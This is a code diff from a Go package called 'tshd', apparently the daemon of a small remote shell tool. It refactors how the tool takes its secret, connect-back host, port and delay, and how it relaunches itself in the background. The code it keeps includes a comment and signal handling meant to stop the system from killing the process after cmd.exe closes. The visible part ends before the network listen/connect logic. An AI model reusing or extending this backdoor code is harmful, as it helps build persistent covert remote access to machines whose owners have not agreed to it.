@@ -1,7 +1,6 @@
 package tshd
 
 import (
-	"flag"
 	"fmt"
 	"os"
 	"os/exec"
@@ -17,40 +16,30 @@ import (
 )
 
 func RunInBackground() {
-	args := append([]string{"-daemon"}, os.Args[1:]...)
 	fullpath, _ := filepath.Abs(os.Args[0])
-	cmd := exec.Command(fullpath, args...)
-	cmd.Env = os.Environ()
+	cmd := exec.Command(fullpath, os.Args[1:]...)
+	cmd.Env = append(os.Environ(), "TSH_RUNNING_AS_DAEMON=1")
 	cmd.Start()
 }
 
-func Run() {
-	var secret, host string
-	var port, delay int
+func Run(secret string, host string, port int, delay int, runAsDaemon bool) {
 	var isDaemon bool
-
-	flagset := flag.NewFlagSet(filepath.Base(os.Args[0]), flag.ExitOnError)
-	flagset.StringVar(&secret, "s", "1234", "secret")
-	flagset.StringVar(&host, "c", "", "connect back host")
-	flagset.IntVar(&delay, "d", 5, "connect back delay")
-	flagset.IntVar(&port, "p", 1234, "port")
-	flagset.BoolVar(&isDaemon, "daemon", false, "(preserved) is in daemon")
-	flagset.Parse(os.Args[1:])
-
-	// if it's not daemon (child process),
-	// run itself again with "-daemon" and exit the parent process.
-	if !isDaemon {
+	if os.Getenv("TSH_RUNNING_AS_DAEMON") == "1" {
+		isDaemon = true
+	}
+	if runAsDaemon && !isDaemon {
 		RunInBackground()
 		os.Exit(0)
 	}
 
-	// don't let system kill our child process after closing cmd.exe
-	sigchan := make(chan os.Signal, 1)
-	signal.Notify(sigchan,
-		syscall.SIGINT,
-		syscall.SIGKILL,
-		syscall.SIGTERM,
-		syscall.SIGQUIT)
+	if runAsDaemon {
+		// don't let system kill our child process after closing cmd.exe
+		sigchan := make(chan os.Signal, 1)
+		signal.Notify(sigchan,
+			syscall.SIGINT,
+			syscall.SIGTERM,
+			syscall.SIGQUIT)
+	}
 
 	if host == "" {
 		addr := fmt.Sprintf(":%d", port)
